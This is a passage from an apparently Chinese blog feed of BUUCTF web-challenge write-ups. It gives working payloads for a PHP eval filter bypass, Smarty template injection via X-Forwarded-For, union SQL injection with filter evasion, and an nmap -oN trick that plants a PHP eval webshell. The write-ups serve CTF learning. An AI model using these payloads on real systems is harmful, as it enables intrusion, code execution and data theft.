class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>    s_hex = s_hex+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(s[i]))[<span class="hljs-number">2</span>:]+<span class="hljs-string">&quot; &quot;</span><br><span class="hljs-built_in">print</span>(s_hex)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">5f 47 45 54 <br></code></pre></td></tr></table></figure><p>发现16进制表示中含有字母，所以会被preg_match_all()函数提取，所以要将该16进制转化为10进制，再由dechex() 将10进制转回给16进制</p><p><strong>16进制转10进制：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;5f474554&quot;</span>,<span class="hljs-number">16</span>,<span class="hljs-number">10</span>).<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-comment">//1598506324</span><br></code></pre></td></tr></table></figure><p>_GET的payload的构造:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">_GET=hex2bin(&quot;5f474554&quot;)<br>hex2bin=base_convert(&quot;37907361743&quot;,10,36)()<br>&quot;5f474554&quot;=dechex(&quot;1598506324&quot;)<br>_GET=base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;))<br></code></pre></td></tr></table></figure><p>所以$_GET{}:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">$(base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;)))&#123;&#125;<br></code></pre></td></tr></table></figure><p>5.构造payload</p><p>原来的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;abs&#125;($_GET&#123;atan&#125;)&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p>转换payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$(base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;)))&#123;abs&#125;($(base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;)))&#123;atan&#125;)&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824143815219.png" alt="image-20230824143815219"></p><p>由于c的长度太长所以必须简化payload</p><p>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag is here&quot;</span>;<br><span class="hljs-comment">//$pi=base_convert(37907361743,10,36)(dechex(1598506324));</span><br><span class="hljs-comment">//($$pi)&#123;a&#125;(($$pi)&#123;b&#125;);</span><br><span class="hljs-comment">//($_GET&#123;a&#125;)($_GET&#123;b&#125;);</span><br><span class="hljs-variable">$base_convert</span>(<span class="hljs-string">&quot;37907361743&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-string">&quot;1598506324&quot;</span>))&#123;a&#125;(<span class="hljs-variable">$base_convert</span>(<span class="hljs-string">&quot;37907361743&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-string">&quot;1598506324&quot;</span>))&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>输出：<br><img src="/images/2023-8-24_LoveMath/image-20230824152553792.png" alt="image-20230824152553792"></p><p>发现系统命令没有被执行，所以直接应用的方式是错误的，我们需要采用间接引用字符串的方式：</p><p><strong>测试:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag is here&quot;</span>;<br><span class="hljs-variable">$_GET</span>&#123;a&#125;(<span class="hljs-variable">$_GET</span>&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?a=system&amp;b=dir<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824144645504.png" alt="image-20230824144645504"></p><p>发生了输出，说明system(dir)在没有echo的情况下依然可以输出内容</p><p>所以我们可以构造多句合法PHP代码使其存在于eval()函数中，使该函数执行多条PHP代码，然后我们在对其进行注入（类似于插入一句话木马）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag is here&quot;</span>;<br><span class="hljs-comment">//$pi=base_convert(37907361743,10,36)(dechex(1598506324));</span><br><span class="hljs-comment">//($$pi)&#123;a&#125;(($$pi)&#123;b&#125;);</span><br><span class="hljs-comment">//($_GET&#123;a&#125;)($_GET&#123;b&#125;);</span><br><span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;37907361743&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-string">&quot;1598506324&quot;</span>));<br><span class="hljs-variable">$$pi</span>&#123;a&#125;(<span class="hljs-variable">$$pi</span>&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>输出:<br><img src="/images/2023-8-24_LoveMath/image-20230824152828967.png" alt="image-20230824152828967"></p><p>6.用间接引用简化payload(使用pi作为参数是因为它既是白名单字符串，同时也很短):</p><p>在PHP函数的参数中string类型都可以不用加双引号或单引号，PHP会自动进行解析,同时用GET或POST方法传输内容时也不需要””和’’:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;atan&#125;);&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824153549268.png" alt="image-20230824153549268"></p><p>发现flag文件，将其打开查看:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;atan&#125;);&amp;abs=system&amp;atan=cat /flag<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824153729500.png" alt="image-20230824153729500"></p><p>flag &#x3D; flag{26bb1d2a-6719-409c-88f7-14461687b994}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN2019 华东南赛区]Web11 题解</title>
    <link href="/2023/08/23/2023-08-23-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11/"/>
    <url>/2023/08/23/2023-08-23-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>1.打开网页后观察:</p><p><img src="/images/2023-8-23_Web11/image-20230823120850043.png" alt="image-20230823120850043"></p><p>根据网页显示的内容得，我们可能需要对网页的请求头进行更改</p><p>2.BP抓包:<br><img src="/images/2023-8-23_Web11/image-20230823121029643.png" alt="image-20230823121029643"></p><p>由网页显示的内容得，我们可能需要修改headers中的X-Forwarded-For</p><p>对该字段进行修改，先随便写一个IP：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121206963.png" alt="image-20230823121206963"></p><p>我们输入的内容在网页的Current IP中显示，即我们输入的内容可以被渲染传送到html中显示，所以猜测该字段存在ssti注入</p><p>3.判断是否存在模板注入:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;8*8&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121359664.png" alt="image-20230823121359664"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;&#123;&#125;&#125;中的代码被执行输出64，所以该字段存在ssti注入<br></code></pre></td></tr></table></figure><p>4.判断该模板的类型:<br>用判断是否为Smarty模板注入:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;$smarty.version&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121632709.png" alt="image-20230823121632709"></p><p>爆出版本信息:3.1.30,所以该网页使用的是smarty模板</p><p>5.使用ssti在Smarty模板中的恶意代码:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;system(&quot;ls /&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121828541.png" alt="image-20230823121828541"></p><p>发现有一个flag文件，查看flag文件的内容:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121932270.png" alt="image-20230823121932270"></p><p>flag&#x3D;flag{0f8c1a6e-bf4c-4d5e-ad9e-f6282d3fe876}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[SWPU2019]Web1 题解</title>
    <link href="/2023/08/23/2023-08-23-%5BSWPU2019%5DWeb1/"/>
    <url>/2023/08/23/2023-08-23-%5BSWPU2019%5DWeb1/</url>
    
    <content type="html"><![CDATA[<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>1.点击网页之后，注册一个账户，然后登录(登录界面和注册界面的sql注入已经测试，发现没有用):<br><img src="/images/2023-08-23_Web1/image-20230823141144322.png" alt="image-20230823141144322"></p><p>2.点击申请一个广告:</p><p><img src="/images/2023-08-23_Web1/image-20230823141243172.png" alt="image-20230823141243172"></p><p>在该页面中也存在疑似注入点，先随机申请一个广告:<br><img src="/images/2023-08-23_Web1/image-20230823141351148.png" alt="image-20230823141351148"></p><p>3.点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823141456102.png" alt="image-20230823141456102"></p><p>显示了该广告的内容</p><p>4.猜测该页面的事务处理逻辑：<br><strong>申请广告页面:</strong></p><p>insert into table VALUES(“广告名”,”广告内容”,……..);</p><p><strong>index.php显示内容：</strong><br>select * from table</p><p><strong>广告详情页面:</strong></p><p>select * from table where 广告名 &#x3D;’从界面列表中获取的广告名’</p><p><strong>验证猜测：</strong></p><p>在申请广告页面中:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">广告名:1&#x27;<br>广告内容:aaaaa<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823142529330.png" alt="image-20230823142529330"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823142551729.png" alt="image-20230823142551729"></p><p>发生sql报错，所以可以证实我们的猜想，广告详情存在sql注入漏洞:<br>select * from table where 广告名 &#x3D;’1’’</p><p>5.sql注入:<br><strong>第一步，爆字段：</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27; union select 1,2,3 #<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823143036837.png" alt="image-20230823143036837"></p><p>发现对输入内容进行了过滤,对输入内容进行判断，看看它过滤了哪些内容:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27; union<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823143210775.png" alt="image-20230823143210775"></p><p>可以进行申请，但是在显示的内容中空格被消除了，说明网页对空格进行了处理:<br><strong>对空格进行绕过:</strong><br><img src="/images/2023-08-23_Web1/image-20230823143443665.png" alt="image-20230823143443665"></p><p>所以空格可以用&#x2F;**&#x2F;代替</p><p><img src="/images/2023-08-23_Web1/image-20230823144042281.png" alt="image-20230823144042281"></p><p>所以也可以用()绕过空格</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823144331977.png" alt="image-20230823144331977"></p><p>没有过滤select</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823144539306.png" alt="image-20230823144539306"></p><p>说明该站点过滤了#</p><p><strong>#号绕过：</strong></p><p><img src="/images/2023-08-23_Web1/image-20230823145455569.png" alt="image-20230823145455569"></p><p>所以可以用&#x2F;**&#x2F;‘通过闭合’绕过</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823145739643.png" alt="image-20230823145739643"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823145919546.png" alt="image-20230823145919546"></p><p>成功爆出字段不一致的错误，说明当前注入方式正确，现在只要一步步添加上去或减少，来确认它到底有多少字段(也可以用order by 或group by 来判断有多少字段),最终添加到22的时候成功:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823150404948.png" alt="image-20230823150404948"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823150443148.png" alt="image-20230823150443148"></p><p>没有报错，说明当前表总共有22个字段,且由显示的内容得，只显示了2，3，说明该数据表的内容在html中（在数据库中select一定是全部搜索出来的）只显示第二个字段和第三个字段，所以我们要爆的内容也只能在这两个字段中显示</p><p><strong>第二步，爆数据库</strong>：</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823151000019.png" alt="image-20230823151000019"></p><p>爆出数据库只有web1</p><p><strong>第三步，爆表：</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.tables/**/where/**/table_schema=DATABASE()/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152137236.png" alt="image-20230823152137236"></p><p>对输入内容进行一一判断:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152224914.png" alt="image-20230823152224914"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.tables<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152317844.png" alt="image-20230823152317844"></p><p>猜测敏感词汇为information_schema.tables</p><p><strong>information_schema.tables绕过：</strong></p><p><img src="/images/2023-08-23_Web1/image-20230823152947582.png" alt="image-20230823152947582"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&#x27;web1&#x27;/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153243260.png" alt="image-20230823153243260"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823153322133.png" alt="image-20230823153322133"></p><p>爆出两张表:ads,users</p><p><strong>第四步，爆表的字段：</strong></p><p>先爆ads的字段</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.COLUMNS/**/where table_schema=&#x27;web1&#x27;/**/and/**/table_name=&#x27;ads&#x27;/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153803945.png" alt="image-20230823153803945"></p><p>对注入内容进行一一判断:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">group_concat(column_name)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153845408.png" alt="image-20230823153845408"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.COLUMNS<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153914234.png" alt="image-20230823153914234"></p><p>猜测可能是对information_schema.COLUMNS进行了过滤</p><p><strong>information_schema.COLUMNS绕过:</strong></p><p>由于无法绕过information_schema.COLUMNS，但是在已经知道表明的情况下可以采用无列名爆破法:</p><p>参考:[<a href="https://blog.csdn.net/shinygod/article/details/123681039">SWPU2019]Web1 1_succ3的博客-CSDN博客</a></p><p>参考的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs txt">普通的sq查询<br>select * from users<br><br>查询表，并把列名替换为1，2，3.4，5，6<br>select 1,2,3,4,5 ,6 union select * from users<br><br>单独把第四列提出来，(select 1,2,3,4,5,6 union select * from users)a给查询结果命名<br> select `4` from (select 1,2,3,4,5,6 union select * from users)a;<br><br>若反引号被过滤，可以这样<br>select b from (select 1,2,3 as b,4,5 union select * from users)a;<br><br>测试:<br>-- 在已经知道beanbook表，但是不知道其字段名的情况下，爆出该表的字段值<br>-- 爆出第3列的值,把3当作第三列的字段名<br>select `3` from <br>(select 1,2,3,4,5,6 union select * from beanbook) as b<br><br>-- 爆出第1列的值，把别名a当作第一列的字段名<br>select a from <br>(select 1 as a,2,3,4,5,6 union select * from beanbook) as b<br></code></pre></td></tr></table></figure><p>无列名爆破法测试:</p><p>第一种:</p><p><img src="/images/2023-08-23_Web1/image-20230823155738540.png" alt="image-20230823155738540"></p><p>第二种:<br><img src="/images/2023-08-23_Web1/image-20230823155947247.png" alt="image-20230823155947247"></p><p>根据无名列爆破的payload,我们先要确认该表有多少个字段:</p><p>（flag在users表中，所以在这里省略对ads表的判断，思路和users表一样）</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/b/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823161617410.png" alt="image-20230823161617410"></p><p>继续添加字段，（省略两个字段的判断）</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/b,2,3/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823161924192.png" alt="image-20230823161924192"></p><p>回显了第一列的所有内容，说明users表的字段有三个</p><p>回显第二个字段的内容:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/b,3/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823162104825.png" alt="image-20230823162104825"></p><p>发现了flag,但是不是flag的内容，说明flag内容在第三个字段中</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823162243017.png" alt="image-20230823162243017"></p><p>flag&#x3D;flag{507104d6-24f2-405b-8de5-f60bdc690138}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[网鼎杯 2020 朱雀组]Nmap 题解</title>
    <link href="/2023/08/22/2023-08-22-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap/"/>
    <url>/2023/08/22/2023-08-22-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap/</url>
    
    <content type="html"><![CDATA[<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>1.有题目提示得这是一道考察Nmap执行的题目:<br><img src="/images/2023-08-22_Nmap/image-20230822100327583.png" alt="image-20230822100327583"></p><p>输入框中我们可以输入ip地址或hostname</p><p>测试:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-08-22_Nmap/image-20230822100434322.png" alt="image-20230822100434322"></p><p>2.在kali中测试nmap:</p><p>nmap对ip地址的处理</p><p><strong>扫描IP地址:</strong></p><p>nmap 127.0.0.1:<br><img src="/images/2023-08-22_Nmap/image-20230822101659678.png" alt="image-20230822101659678"></p><p>返回的结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Not shown: 1000 closed tcp ports (conn-refused)<br><br>Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds<br></code></pre></td></tr></table></figure><p>而网站中的返回结果为:</p><p><img src="/images/2023-08-22_Nmap/image-20230822102909620.png" alt="image-20230822102909620"></p><p>两者的返回结果都是TCP协议，然后有Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds</p><p>**扫描指定IP地址(ping 扫描)**：<br><img src="/images/2023-08-22_Nmap/image-20230822103048486.png" alt="image-20230822103048486"></p><p>返回结果中没有表明是TCP协议</p><p>所以一般网站使用TCP返回，都是nmap扫描或nmap -sT 扫描(默认是nmap)</p><p>猜测该网址的扫描形式为:nmap “输入的ip地址”</p><p>2.nmap扫描漏洞利用:</p><p>nmap中可以用于将扫描结果写文件并输出保存在本地的命令:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">-oN (标准输出)<br><br>-oX (XML输出)<br><br>-oS (ScRipT KIdd|3 oUTpuT)<br><br>-oG (Grep输出)<br><br>-oA (输出至所有格式)<br></code></pre></td></tr></table></figure><p>测试:<br>nmap  127.0.0.1 -oN test.txt:<br><img src="/images/2023-08-22_Nmap/image-20230822104553681.png" alt="image-20230822104553681"></p><p>发现在当前文件夹中生成了一个test.txt文件</p><p>所以我们可以利用输出这个漏洞，将一句话木马写入文件中，利用该输出漏洞将一句话木马文件保存到网页的当前文件夹中，就可以实现注入</p><p>测试2:</p><p>测试网页是否可以进行输出命令的执行:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1 -oN test.txt<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822105255949.png" alt="image-20230822105255949"></p><p>网页成功回显，且返回的结果和测试的结果相似，说明该指令被成功执行，所以我们就可以构造注入payload</p><p>3.构造一句话木马:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;  -oN pass.php<br></code></pre></td></tr></table></figure><p>响应结果:<br><img src="/images/2023-08-22_Nmap/image-20230822105623631.png" 